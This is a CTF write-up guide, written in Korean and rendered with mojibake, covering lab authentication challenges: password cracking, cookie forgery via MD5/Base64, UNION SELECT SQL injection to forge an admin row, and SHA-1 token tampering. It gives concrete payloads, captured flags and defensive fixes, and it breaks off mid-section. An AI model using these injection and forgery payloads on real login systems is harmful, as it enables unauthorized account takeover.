# Authentication & Authorization ì™„ì „ ì •ë³µ ê°€ì´ë“œ

> 7ê°œì˜ ì‹¤ì „ ë¬¸ì œë¡œ ë°°ìš°ëŠ” ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬ ê³µê²© ê¸°ë²•

## ğŸ“š ëª©ì°¨

- [í•™ìŠµ ê°€ì´ë“œ](#í•™ìŠµ-ê°€ì´ë“œ)
- [ë¬¸ì œ ëª©ë¡](#ë¬¸ì œ-ëª©ë¡)
  - [ğŸŸ¢ Beginner](#beginner)
  - [ğŸŸ¡ Intermediate](#intermediate)
  - [ğŸ”´ Advanced](#advanced)
- [í•µì‹¬ ê°œë… ì •ë¦¬](#í•µì‹¬-ê°œë…-ì •ë¦¬)
- [ë°©ì–´ ê¸°ë²•](#ë°©ì–´-ê¸°ë²•)
- [ì°¸ê³  ìë£Œ](#ì°¸ê³ -ìë£Œ)

---

## í•™ìŠµ ê°€ì´ë“œ

### ì¶”ì²œ í•™ìŠµ ìˆœì„œ

1. **Basic_Auth** (Beginner) - Apache ê¸°ë³¸ ì¸ì¦ê³¼ ë¹„ë°€ë²ˆí˜¸ í¬ë˜í‚¹ - 30ë¶„
2. **Cookie** (Beginner) - ì¿ í‚¤ ì¡°ì‘ ë° ì¸ì½”ë”© ìš°íšŒ - 20ë¶„
3. **ADMIN_Page** (Intermediate) - UNION SELECTë¥¼ í†µí•œ ë°ì´í„° ìœ„ì¡° - 45ë¶„
4. **Insufficient_Auth** (Intermediate) - SHA-1 í† í°ì„ ì´ìš©í•œ ê¶Œí•œ ìƒìŠ¹ - 40ë¶„
5. **Process_Validation** (Intermediate) - IDOR ì·¨ì•½ì  ì•…ìš© - 35ë¶„
6. **Serialize_I** (Advanced) - PHP Object Injection ê¸°ì´ˆ - 90ë¶„
7. **Serialize_II** (Advanced) - íŒŒì¼ ì½ê¸°ë¥¼ í†µí•œ ì²´ì´ë‹ ê³µê²© - 60ë¶„

**ì´ í•™ìŠµ ì‹œê°„**: ì•½ 5ì‹œê°„ 20ë¶„

### í•™ìŠµ ëª©í‘œ

ì´ ì¹´í…Œê³ ë¦¬ë¥¼ ì™„ë£Œí•˜ë©´:

- âœ… ì¿ í‚¤ ê¸°ë°˜ ì¸ì¦ì˜ ì·¨ì•½ì ê³¼ ì¡°ì‘ ê¸°ë²• ì´í•´
- âœ… ì„¸ì…˜ ê´€ë¦¬ì˜ ë³´ì•ˆ ì›ì¹™ ìŠµë“
- âœ… IDOR (Insecure Direct Object Reference) ì·¨ì•½ì  ì‹ë³„ ë° ì•…ìš©
- âœ… SQL Injectionì„ í†µí•œ ì¸ì¦ ìš°íšŒ ê¸°ë²•
- âœ… PHP Object Injectionì˜ ì›ë¦¬ì™€ ìœ„í—˜ì„± ì™„ë²½ ì´í•´
- âœ… ì·¨ì•½ì  ì²´ì´ë‹ (Vulnerability Chaining) ì „ëµ ìˆ˜ë¦½
- âœ… ì•ˆì „í•œ ì¸ì¦ ì‹œìŠ¤í…œ ì„¤ê³„ ëŠ¥ë ¥ í™•ë³´

### script ì—°ë™

**ê´€ë ¨ Phase**: Authentication & Session Management
- Phase 2: [ì¸ì¦ ì·¨ì•½ì  ê¸°ì´ˆ](/script/phase2-vulnerability-basics/)
- Phase 4: [ê³ ê¸‰ ì¸ì¦ ìš°íšŒ ê¸°ë²•](/script/phase4-advanced-techniques/)

---

## ë¬¸ì œ ëª©ë¡

### ğŸŸ¢ Beginner

#### [Hacker's Diary] Basic Auth: êµ³ê²Œ ë‹«íŒ ì•„íŒŒì¹˜ì˜ ë¬¸ (ì¬ë„ì „)

**ë‚œì´ë„**: ğŸŸ¢ Beginner
**ì˜ˆìƒ ì‹œê°„**: â±ï¸ 30ë¶„
**ì£¼ìš” ê¸°ìˆ **: `#Apache-Basic-Auth` `#htpasswd` `#John-the-Ripper` `#Vulnerability-Chaining`
**ê´€ë ¨ ìŠ¤í¬ë¦½íŠ¸**: [solve_basic_auth.sh](../Scripts/solve_basic_auth.sh)

## 1. ê°œìš”
ì•„íŒŒì¹˜ ê¸°ë³¸ ì¸ì¦ì´ ì„¤ì •ëœ í˜ì´ì§€ì˜ ì¸ì¦ ì •ë³´ë¥¼ ë‹¤ë¥¸ ë¬¸ì œì˜ ì·¨ì•½ì ì„ í†µí•´ íšë“í•˜ê³ , ë¹„ë°€ë²ˆí˜¸ í¬ë˜í‚¹ì„ ê±°ì³ ìµœì¢… ê¶Œí•œì„ íšë“í•˜ëŠ” ë¬¸ì œë‹¤.

## 2. ì·¨ì•½ì  ë¶„ì„ ë° ê°€ì„¤ ìˆ˜ë¦½

### ê°€ì„¤ 1: ì·¨ì•½ì  ì²´ì´ë‹ (Serialize II + Basic Auth)
*   `Serialize II`ì—ì„œ ë°œê²¬ëœ `unserialize` íŒŒì¼ ì½ê¸° ì·¨ì•½ì ì´ `basic_auth` ë¬¸ì œ ë””ë ‰í† ë¦¬ì˜ íŒŒì¼ì—ë„ ì ‘ê·¼ ê°€ëŠ¥í•  ê²ƒì´ë‹¤.
*   ëŒ€ìƒ ê²½ë¡œ: `../../basic_auth/.htpasswd`

### ê°€ì„¤ 2: ë¹„ë°€ë²ˆí˜¸ í•´ë… (John the Ripper)
*   `.htpasswd`ë¥¼ íƒˆì·¨í•˜ë©´ **John the Ripper**ì™€ **RockYou** ì›Œë“œë¦¬ìŠ¤íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ í‰ë¬¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.

## 3. ê³µê²© ì‹¤í–‰ ë° ê²€ì¦ (ì§„í–‰ ì¤‘)
### 1ë‹¨ê³„: .htpasswd íŒŒì¼ íƒˆì·¨ ì‹œë„
`Serialize II` ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ `basic_auth` ë””ë ‰í† ë¦¬ì˜ ì¸ì¦ íŒŒì¼ì„ ì½ì–´ì˜¨ë‹¤.

**FLAG**: `[ì²´ì´ë‹ ê³µê²©ì„ í†µí•œ FLAG íšë“]`

---

#### [Hacker's Diary] Cookie: ë„ˆë¥¼ ìœ„í•´ êµ¬ìš´ íŠ¹ë³„í•œ ë ˆì‹œí”¼

**ë‚œì´ë„**: ğŸŸ¢ Beginner
**ì˜ˆìƒ ì‹œê°„**: â±ï¸ 20ë¶„
**ì£¼ìš” ê¸°ìˆ **: `#Cookie-Manipulation` `#MD5` `#Base64` `#Client-Side-Trust`
**ê´€ë ¨ ìŠ¤í¬ë¦½íŠ¸**: [solve_cookie.py](../Scripts/solve_cookie.py)

## 1. ê°œìš”
ì¿ í‚¤ ê°’ì„ ì¡°ì‘í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œì„ íšë“í•˜ê³  í”Œë˜ê·¸ë¥¼ ì°¾ëŠ” ë¬¸ì œë‹¤. íŒíŠ¸ëŠ” ì¿ í‚¤ ìì²´ì— ì§‘ì¤‘í•  ê²ƒì„ ìš”êµ¬í•œë‹¤.

## 2. ì·¨ì•½ì  ë¶„ì„ ë° ê°€ì„¤ ìˆ˜ë¦½

### ê°€ì„¤ 1: ì¿ í‚¤ ì´ë¦„ ë° ê°’ ë³€ì¡°
*   í˜„ì¬ `sessionId=admin` ì¿ í‚¤ë¥¼ ë³´ë‚´ê³  ìˆìœ¼ë‚˜ `Access Denied`ê°€ ë°œìƒí•œë‹¤. ì´ëŠ” ì„œë²„ê°€ ê¸°ëŒ€í•˜ëŠ” ì¿ í‚¤ ì´ë¦„ì´ë‚˜ ê°’ì´ ë‹¤ë¥¼ ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•œë‹¤.

### ê°€ì„¤ 2: ì†ŒìŠ¤ ì½”ë“œ ë…¸ì¶œ (index.phps)
*   ì„œë²„ ì‚¬ì´ë“œ ë¡œì§ì„ í™•ì¸í•˜ê¸° ìœ„í•´ `.phps` í™•ì¥ìë¡œ ì ‘ê·¼í•˜ì—¬ ì •í™•í•œ ì¿ í‚¤ ê²€ì¦ ë¡œì§ì„ íŒŒì•…í•œë‹¤.

### 2ë‹¨ê³„: ì¿ í‚¤ ë³€ì¡° ë° í”Œë˜ê·¸ íšë“
ë¶„ì„ ê²°ê³¼ ì„œë²„ëŠ” `user_id`ë¼ëŠ” ì´ë¦„ì˜ ì¿ í‚¤ë¥¼ í†µí•´ ì‚¬ìš©ìë¥¼ ì‹ë³„í•˜ë©°, í•´ë‹¹ ê°’ì€ íŠ¹ì • ë¡œì§ìœ¼ë¡œ ë³´í˜¸ë˜ê³  ìˆì—ˆë‹¤. ê´€ë¦¬ì ê¶Œí•œì„ ì–»ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì´ ì¿ í‚¤ë¥¼ ìƒì„±í•˜ì—¬ ì „ì†¡í–ˆë‹¤.

1.  **ëŒ€ìƒ ë¬¸ìì—´**: `admin`
2.  **MD5 í•´ì‹±**: `21232f297a57a5a743894a0e4a801fc3`
3.  **Base64 ì¸ì½”ë”©**: `MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=`

ì¡°ì‘ëœ ì¿ í‚¤(`user_id=MjEyMz...`)ë¥¼ í¬í•¨í•˜ì—¬ ìš”ì²­ì„ ë³´ë‚¸ ê²°ê³¼, ì„œë²„ë¡œë¶€í„° ê´€ë¦¬ì í™˜ì˜ ë©”ì‹œì§€ì™€ í•¨ê»˜ í”Œë˜ê·¸ë¥¼ íšë“í–ˆë‹¤.

*   **ìµœì¢… FLAG**: `705abb7a147d1278a3bd36ee29aa699e`

## 4. ê²°ê³¼: ì·¨ì•½í•œ ì¿ í‚¤ ê¸°ë°˜ ì¸ì¦ ë¡œì§
ì„œë²„ê°€ í´ë¼ì´ì–¸íŠ¸ ì¸¡ì—ì„œ ì œê³µí•˜ëŠ” ì¿ í‚¤ ê°’ì„ ì‹ ë¢°í•˜ê³ , ë‹¨ìˆœí•œ í•´ì‹±ì´ë‚˜ ì¸ì½”ë”©ë§Œìœ¼ë¡œ ê¶Œí•œì„ ê²€ì¦í•  ë•Œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì´ë‹¤. MD5ì™€ Base64ëŠ” ì—­ì¶”ì ì´ ê°€ëŠ¥í•˜ê±°ë‚˜ ê³ ì •ëœ ê°’ì„ ê°€ì§€ë¯€ë¡œ ê³µê²©ìê°€ ë¡œì§ì„ íŒŒì•…í•  ê²½ìš° ì†ì‰½ê²Œ ìš°íšŒí•  ìˆ˜ ìˆë‹¤.

## 5. ë§ˆë¬´ë¦¬: ë³´ì•ˆ ëŒ€ì±…
1.  **ì„¸ì…˜ ê¸°ë°˜ ì¸ì¦**: í´ë¼ì´ì–¸íŠ¸ê°€ ê°’ì„ ì§ì ‘ ì¡°ì‘í•  ìˆ˜ ìˆëŠ” ì¿ í‚¤ ëŒ€ì‹ , ì„œë²„ ì„¸ì…˜ì— ê¶Œí•œ ì •ë³´ë¥¼ ì €ì¥í•˜ê³  ëœë¤í•œ ì„¸ì…˜ IDë§Œ í´ë¼ì´ì–¸íŠ¸ì— ë¶€ì—¬í•´ì•¼ í•œë‹¤.
2.  **ì„œëª…ëœ ì¿ í‚¤(Signed Cookies) ì‚¬ìš©**: ë§Œì•½ ì¿ í‚¤ì— ì •ë³´ë¥¼ ì €ì¥í•´ì•¼ í•œë‹¤ë©´, ì„œë²„ì˜ ë¹„ë°€í‚¤ë¥¼ ì´ìš©í•œ HMAC ì„œëª…ì„ ì¶”ê°€í•˜ì—¬ ìœ„ë³€ì¡°ë¥¼ ë°©ì§€í•´ì•¼ í•œë‹¤.
3.  **ì•ˆì „í•œ í•´ì‹œ ì•Œê³ ë¦¬ì¦˜ ì‚¬ìš©**: MD5ì™€ ê°™ì´ ì¶©ëŒ ê°€ëŠ¥ì„±ì´ ë†’ì€ ì•Œê³ ë¦¬ì¦˜ ëŒ€ì‹  SHA-256 ì´ìƒì˜ ê°•ë ¥í•œ ì•Œê³ ë¦¬ì¦˜ì„ ì‚¬ìš©í•˜ê³ , ì†”íŠ¸(Salt)ë¥¼ ì¶”ê°€í•˜ì—¬ ì˜ˆì¸¡ ê°€ëŠ¥ì„±ì„ ë‚®ì¶°ì•¼ í•œë‹¤.

---

### ğŸŸ¡ Intermediate

#### [Hacker's Log] ADMIN Page: ë¹„ë°€ë²ˆí˜¸ì˜ ì„±ë²½ì„ ë„˜ì–´ ê°€ì§œ ë°ì´í„°ë¥¼ ì£¼ì…í•˜ë‹¤

**ë‚œì´ë„**: ğŸŸ¡ Intermediate
**ì˜ˆìƒ ì‹œê°„**: â±ï¸ 45ë¶„
**ì£¼ìš” ê¸°ìˆ **: `#UNION-SELECT` `#Data-Forgery` `#SQL-Injection` `#Authentication-Bypass`
**ê´€ë ¨ ìŠ¤í¬ë¦½íŠ¸**: [solve_admin_page.py](../Scripts/solve_admin_page.py)

## 1. ê°œìš”: í•œ ë²ˆ ë” ê¼¬ì•„ë‘” ì¸ì¦ ë¡œì§
ë³´í†µì˜ ê´€ë¦¬ì ì¸ì¦ í˜ì´ì§€ëŠ” `id='admin'--` í•œ ì¤„ì´ë©´ ì†ì ˆì—†ì´ ëš«ë¦¬ê³¤ í•œë‹¤. í•˜ì§€ë§Œ ì´ë²ˆ ë¬¸ì œëŠ” ë‹¬ëë‹¤. "Authorized Personnel Only"ë¼ëŠ” ë¬¸êµ¬ë§Œí¼ì´ë‚˜ ë¡œì§ì´ ê¹ê¹í–ˆë‹¤. ë‹¨ìˆœíˆ ìœ ì €ë¥¼ ì°¾ëŠ” ê²ƒë¿ë§Œ ì•„ë‹ˆë¼, **ê°€ì ¸ì˜¨ ìœ ì €ì˜ ë¹„ë°€ë²ˆí˜¸ì™€ ë‚´ê°€ ì…ë ¥í•œ ë¹„ë°€ë²ˆí˜¸ê°€ ê°™ì€ì§€**ê¹Œì§€ ì²´í¬í•˜ê³  ìˆì—ˆë‹¤.

## 2. ì½”ë“œ ë¶„ì„: ì´ì¤‘ ìë¬¼ì‡ 
`index.phps`ì—ì„œ ë°œê²¬í•œ ì¹˜ëª…ì ì¸(?) ì²´í¬ ë¡œì§ì€ ë‹¤ìŒê³¼ ê°™ì•˜ë‹¤.
```php
if ($row['pw'] == $pw) { // ì²« ë²ˆì§¸ ìë¬¼ì‡ : ë¹„ë°€ë²ˆí˜¸ê°€ ì¼ì¹˜í•´ì•¼ í•¨
    if ($row['id'] === 'admin') { // ë‘ ë²ˆì§¸ ìë¬¼ì‡ : ì•„ì´ë””ê°€ adminì´ì–´ì•¼ í•¨
        echo "FLAG is $flag";
    }
}
```
*   **ë¶„ì„**: ë‚´ê°€ `id` ì…ë ¥ì¹¸ì— ì¸ì ì…˜ì„ í•´ì„œ `admin` ê³„ì •ì„ ê°€ì ¸ì˜¨ë‹¤ í•œë“¤, ê·¸ ê´€ë¦¬ìì˜ **ì§„ì§œ ë¹„ë°€ë²ˆí˜¸**ë¥¼ ëª¨ë¥´ë©´ `$row['pw'] == $pw` ì¡°ê±´ì—ì„œ ë¬´ì¡°ê±´ íŠ•ê²¨ ë‚˜ê°„ë‹¤. ë‚˜ëŠ” ê´€ë¦¬ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì „í˜€ ëª¨ë¥´ëŠ” ìƒíƒœë‹¤.

## 3. ì‹œí–‰ì°©ì˜¤: ì‹¤íŒ¨ì˜ ì—°ëŒ€ê¸°

### ì‹œë„ 1: ì •ì„ì ì¸ ìš°íšŒ (ì‹¤íŒ¨)
*   **ì‹œë„**: `id=admin' #`
*   **ê²°ê³¼**: ì¿¼ë¦¬ëŠ” ì„±ê³µí•˜ì—¬ admin í–‰ì„ ê°€ì ¸ì˜¤ì§€ë§Œ, ë¹„ë°€ë²ˆí˜¸ ì…ë ¥ê°’ì´ í‹€ë¦¬ë¯€ë¡œ ë¡œê·¸ì¸ ì‹¤íŒ¨.

### ì‹œë„ 2: ëª¨ë“  ìœ ì € ê°•ì œ í˜¸ì¶œ (ì‹¤íŒ¨)
*   **ì‹œë„**: `id=' OR 1=1 #`
*   **ê²°ê³¼**: ë³´í†µ ì²« ë²ˆì§¸ ìœ ì €ì¸ `guest` ì •ë³´ë¥¼ ê°€ì ¸ì˜¤ê²Œ ëœë‹¤. ë¹„ë°€ë²ˆí˜¸ë„ ë‹¤ë¥¼ë¿ë”ëŸ¬ ì„¤ë ¹ ê°™ë‹¤ í•´ë„ ì•„ì´ë””ê°€ `admin`ì´ ì•„ë‹ˆë¼ ì‹¤íŒ¨.

### ì‹œë„ 3: ë¹„ë°€ë²ˆí˜¸ ë¬´ë ¥í™” ì‹œë„ (ì‹¤íŒ¨)
*   **ì‹œë„**: `id=admin' AND (pw='' OR 1=1) #`
*   **ë¶„ì„**: ì•„ë¬´ë¦¬ ì¿¼ë¦¬ë¥¼ ì¡°ì‘í•´ë´¤ì **PHP ì½”ë“œ ë ˆë²¨**ì—ì„œ ì´ë¤„ì§€ëŠ” ë¹„êµ(`$row['pw'] == $pw`)ëŠ” ê±´ë“œë¦´ ìˆ˜ ì—†ì—ˆë‹¤.

## 4. í•´ê²°ì˜ ì‹¤ë§ˆë¦¬: "í•„ìš”í•œ ê±´ ë§Œë“¤ì–´ ì“°ì"
ë¬¸ì œ íŒíŠ¸ê°€ ë‹¤ì‹œ ë³´ì˜€ë‹¤. "í•„ìš”í•œ ê±´ ë§Œë“¤ì–´ ì“°ì." ì´ ë§ì€ ê³§, **DBì— ì—†ëŠ” ë°ì´í„°ë¥¼ ë‚´ê°€ ì§ì ‘ ë§Œë“¤ì–´ì„œ ì„œë²„ì— ë˜ì ¸ì£¼ë¼**ëŠ” ëœ»ì´ì—ˆë‹¤.

*   **ê°€ì„¤**: `UNION SELECT`ë¥¼ ì‚¬ìš©í•˜ë©´ ì‹¤ì œ í…Œì´ë¸”ì—ëŠ” ì—†ëŠ” ê°€ìƒì˜ ë ˆì½”ë“œë¥¼ ê²°ê³¼ì…‹ì— ë¼ì›Œ ë„£ì„ ìˆ˜ ìˆë‹¤. ë§Œì•½ ë‚´ê°€ `(admin, 1234)`ë¼ëŠ” í–‰ì„ ì¿¼ë¦¬ ê²°ê³¼ë¡œ ë§Œë“¤ì–´ë‚¸ë‹¤ë©´, ì„œë²„ëŠ” ì´ë¥¼ ì§„ì§œë¡œ ë¯¿ì„ ê²ƒì´ë‹¤.

## 5. ë‹¨ê³„ë³„ ì‹¤í–‰ (Forging Operation)

### 1ë‹¨ê³„: í…Œì´ë¸” êµ¬ì¡°(ì»¬ëŸ¼ ìˆ˜) íŒŒì•…
`UNION`ì„ ì“°ë ¤ë©´ ì›ë³¸ í…Œì´ë¸”ì˜ ì»¬ëŸ¼ ê°œìˆ˜ë¥¼ ì •í™•íˆ ì•Œì•„ì•¼ í•œë‹¤.
- `id=none' union select 1 #` -> ì—ëŸ¬
- `id=none' union select 1,2 #` -> **ì •ìƒ!**
ì´ í…Œì´ë¸”ì€ `(id, pw)` í˜¹ì€ ê·¸ ë°˜ëŒ€ì˜ ìˆœì„œë¡œ ë”± ë‘ ê°œì˜ ì»¬ëŸ¼ë§Œ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œì•„ëƒˆë‹¤.

### 2ë‹¨ê³„: ê°€ì§œ ë ˆì½”ë“œ ì£¼ì…
ì´ì œ ì¿¼ë¦¬ë¥¼ ì •êµí•˜ê²Œ ì§ ë‹¤.
*   **ì „ëµ**: ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ì•„ì´ë””ë¥¼ ì¡°íšŒí•˜ì—¬ ì•ì˜ ì¿¼ë¦¬ ê²°ê³¼(True Data)ë¥¼ ë¹„ìš°ê³ , ê·¸ ë’¤ì— ë‚´ê°€ ì¡°ì‘í•œ ê²°ê³¼(Fake Data)ë¥¼ ë¶™ì¸ë‹¤.
*   **Payload**:
    - `id`: `none' union select 'admin', '1234' #`
    - `pw`: `1234`
*   **ì„œë²„ ë‚´ ë™ì‘**:
    1. ì¿¼ë¦¬ ê²°ê³¼ë¡œ `array('id' => 'admin', 'pw' => '1234')`ê°€ ë°˜í™˜ë¨.
    2. PHP ë¡œì§: `$row['pw']`(1234)ì™€ ë‚´ê°€ ì…ë ¥í•œ `$pw`(1234)ë¥¼ ë¹„êµ -> **ì¼ì¹˜!**
    3. PHP ë¡œì§: `$row['id']`(admin)ê°€ 'admin'ì¸ì§€ í™•ì¸ -> **ì¼ì¹˜!**

## 6. ìµœì¢… ì„±ê³µ
*   **ê²°ê³¼**: `[*] Login success! FLAG is c324f8d06a79a11d7ad4fa697c5c5c1a`

## 7. ì†Œê°
ë°ì´í„°ë² ì´ìŠ¤ëŠ” ì •ì§í•˜ê²Œ ì €ì¥ëœ ê°’ë§Œ ë±‰ëŠ” ê¸°ê³„ë¼ê³  ìƒê°í–ˆëŠ”ë°, `UNION SELECT`ì™€ ë§Œë‚˜ë©´ í•´ì»¤ì˜ ì…ë§›ëŒ€ë¡œ ê²°ê³¼ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆëŠ” 'ìœ„ì¡° ê¸°ê³„'ê°€ ëœë‹¤ëŠ” ê²ƒì„ ê¹¨ë‹¬ì•˜ë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë¡œì§ì´ ì•„ë¬´ë¦¬ ì™„ë²½í•´ë„, ê·¸ ë¡œì§ì— ì…ë ¥ë˜ëŠ” ë°ì´í„° ìì²´ê°€ ì¡°ì‘ë  ìˆ˜ ìˆë‹¤ë©´ ë³´ì•ˆì€ ë¬´ì˜ë¯¸í•˜ë‹¤ëŠ” êµí›ˆì„ ì–»ì—ˆë‹¤.

**FLAG**: `c324f8d06a79a11d7ad4fa697c5c5c1a`

---

#### [Hacker's Diary] Insufficient Auth: í•œ ë²ˆì˜ ì¸ì¦ ê·¸ ë„ˆë¨¸

**ë‚œì´ë„**: ğŸŸ¡ Intermediate
**ì˜ˆìƒ ì‹œê°„**: â±ï¸ 40ë¶„
**ì£¼ìš” ê¸°ìˆ **: `#Privilege-Escalation` `#SHA-1` `#Token-Manipulation` `#IDOR`
**ê´€ë ¨ ìŠ¤í¬ë¦½íŠ¸**: [solve_insufficient_auth.py](../Scripts/solve_insufficient_auth.py)

## 1. ê°œìš”
ì¼ë°˜ ì‚¬ìš©ìë¡œ ì¸ì¦ì„ ë§ˆì¹œ í›„, ê´€ë¦¬ì ê¶Œí•œì— ëŒ€í•œ ì¶”ê°€ì ì¸ ê²€ì¦ì´ ë¯¸í¡í•œ ì ì„ ì•…ìš©í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•˜ëŠ” ë¬¸ì œë‹¤.

## 2. ì·¨ì•½ì  ë¶„ì„ ë° ê°€ì„¤ ìˆ˜ë¦½

### ê°€ì„¤ 1: ê¶Œí•œ ë³€ì¡° (Privilege Escalation via Cookie)
*   ë¡œê·¸ì¸ ì„±ê³µ ì‹œ ë°œê¸‰ë˜ëŠ” ì¿ í‚¤ ê°’ ì¤‘ ê¶Œí•œì„ ê²°ì •í•˜ëŠ” ìš”ì†Œ(ì˜ˆ: `level`, `role`, `admin`)ë¥¼ ì¡°ì‘í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œì„ íšë“í•œë‹¤.

### ê°€ì„¤ 2: ë¯¸í¡í•œ í˜ì´ì§€ ì ‘ê·¼ ì œì–´
*   ì¼ë°˜ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸ëœ ìƒíƒœì—ì„œ ê´€ë¦¬ì ì „ìš© ê²½ë¡œ(ì˜ˆ: `?mode=admin`, `admin.php`)ì— ì ‘ê·¼í•  ë•Œ ì„œë²„ê°€ ì¶”ê°€ì ì¸ ê¶Œí•œ í™•ì¸ì„ ìˆ˜í–‰í•˜ì§€ ì•Šì„ ê²ƒì´ë‹¤.

### 2ë‹¨ê³„: ì‹ë³„ì í† í° ë¶„ì„ ë° ë³€ì¡°
íšŒì› ì •ë³´ ìˆ˜ì • í˜ì´ì§€(`?mode=modify`)ì—ì„œ ìˆ¨ê²¨ì§„ í•„ë“œ `check`ì˜ ê°’ `35675e68f4b5af7b995d9205ad0fc43842f16450`ì´ í˜„ì¬ ë¡œê·¸ì¸í•œ ì‚¬ìš©ì ì•„ì´ë””(`guest`)ì˜ SHA-1 í•´ì‹œì„ì„ í™•ì¸í–ˆë‹¤.

ê´€ë¦¬ìì˜ ì •ë³´ë¥¼ ìˆ˜ì •í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì´ ìš”ì²­ì„ ë³€ì¡°í•˜ì—¬ ì „ì†¡í–ˆë‹¤.
1.  **ëŒ€ìƒ**: `admin`
2.  **í•´ì‹œ ìƒì„±**: `admin` -> `d033e22ae348aeb5660fc2140aec35850c4da997` (SHA-1)
3.  **ìˆ˜ì • ìš”ì²­**: `check` ê°’ì„ ê´€ë¦¬ìì˜ í•´ì‹œë¡œ, `id`ì™€ `pw`ë¥¼ `admin`ìœ¼ë¡œ ì„¤ì •í•˜ì—¬ POST ìš”ì²­.

### 3ë‹¨ê³„: ê´€ë¦¬ì ê³„ì • íƒˆì·¨ ë° í”Œë˜ê·¸ íšë“
ì„œë²„ëŠ” `check` í† í°ì´ ìœ íš¨í•œ ê´€ë¦¬ìì˜ ê²ƒì´ë¼ê³  íŒë‹¨í•˜ì—¬ í•´ë‹¹ ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ ìˆ˜ì •ì„ í—ˆìš©í–ˆë‹¤. ì´í›„ ìˆ˜ì •ëœ ê³„ì • ì •ë³´(`admin/admin`)ë¡œ ë‹¤ì‹œ ë¡œê·¸ì¸í•˜ì—¬ ë©”ì¸ í˜ì´ì§€ì— ë…¸ì¶œëœ í”Œë˜ê·¸ë¥¼ í™•ì¸í–ˆë‹¤.

*   **ìµœì¢… FLAG**: `346f1d1f94d526c9daa051a708e58782`

## 4. ê²°ê³¼: ë¶€ì ì ˆí•œ ì¸ì¦ í† í° ê´€ë¦¬ ë° ê¶Œí•œ ìƒìŠ¹
ì„œë²„ê°€ ì‚¬ìš©ìë¥¼ ì‹ë³„í•  ë•Œ ì˜ˆì¸¡ ê°€ëŠ¥í•œ ë°©ì‹(ë‹¨ìˆœ í•´ì‹±)ì˜ í† í°ì„ ì‚¬ìš©í•˜ê³ , í´ë¼ì´ì–¸íŠ¸ê°€ ë³´ë‚´ëŠ” í† í° ê°’ì„ ì¬ê²€ì¦ ì—†ì´ ì‹ ë¢°í–ˆë‹¤. ë˜í•œ, í•œ ë²ˆì˜ ì¸ì¦(guest) ì´í›„ ë‹¤ë¥¸ ê³„ì •ì˜ ì •ë³´ë¥¼ ìˆ˜ì •í•˜ëŠ” ê³¼ì •ì—ì„œ ê¶Œí•œ ì²´í¬ê°€ ëˆ„ë½ëœ "ë¶€ì ì ˆí•œ ì¸ì¦" ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆë‹¤.

## 5. ë§ˆë¬´ë¦¬: ë³´ì•ˆ ëŒ€ì±…
1.  **ê°•ë ¥í•œ ì„¸ì…˜ ê´€ë¦¬**: ì‚¬ìš©ìë¥¼ ì‹ë³„í•  ë•ŒëŠ” ì¶”ì¸¡ì´ ë¶ˆê°€ëŠ¥í•œ ëœë¤í•œ ì„¸ì…˜ IDë¥¼ ì‚¬ìš©í•´ì•¼ í•˜ë©°, í´ë¼ì´ì–¸íŠ¸ê°€ ë³´ë‚´ëŠ” ì‹ë³„ì í† í°ì„ ë§¹ì‹ í•´ì„œëŠ” ì•ˆ ëœë‹¤.
2.  **ì„œë²„ ì‚¬ì´ë“œ ê¶Œí•œ ê²€ì¦**: ë¯¼ê°í•œ ì •ë³´ ìˆ˜ì • ì‹œ, ìš”ì²­ì„ ë³´ë‚¸ ì„¸ì…˜ì˜ ì‹¤ì œ ì£¼ì¸ê³¼ ìˆ˜ì • ëŒ€ìƒì´ ì¼ì¹˜í•˜ëŠ”ì§€ ë°ì´í„°ë² ì´ìŠ¤ ë ˆë²¨ì—ì„œ ë§¤ë²ˆ í™•ì¸í•´ì•¼ í•œë‹¤.
3.  **ì•ˆì „í•œ í† í° ì„¤ê³„**: ë§Œì•½ ë³„ë„ì˜ í† í°ì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤ë©´, ì„œë²„ë§Œ ì•Œê³  ìˆëŠ” ì†”íŠ¸(Salt)ë¥¼ í¬í•¨í•˜ê±°ë‚˜ ì„œëª…(Signature)ì„ ì¶”ê°€í•˜ì—¬ ìœ„ë³€ì¡°ë¥¼ ì›ì²œ ì°¨ë‹¨í•´ì•¼ í•œë‹¤.

**FLAG**: `346f1d1f94d526c9daa051a708e58782`

---

#### [Hacker's Diary] Process Validation: ê²€ì¦ë˜ì§€ ì•Šì€ í”„ë¡œì„¸ìŠ¤ì˜ í‹ˆìƒˆ

**ë‚œì´ë„**: ğŸŸ¡ Intermediate
**ì˜ˆìƒ ì‹œê°„**: â±ï¸ 35ë¶„
**ì£¼ìš” ê¸°ìˆ **: `#IDOR` `#Access-Control` `#Process-Logic-Flaw` `#Authorization-Bypass`
**ê´€ë ¨ ìŠ¤í¬ë¦½íŠ¸**: [solve_process_validation.py](../Scripts/solve_process_validation.py)

## 1. ê°œìš”
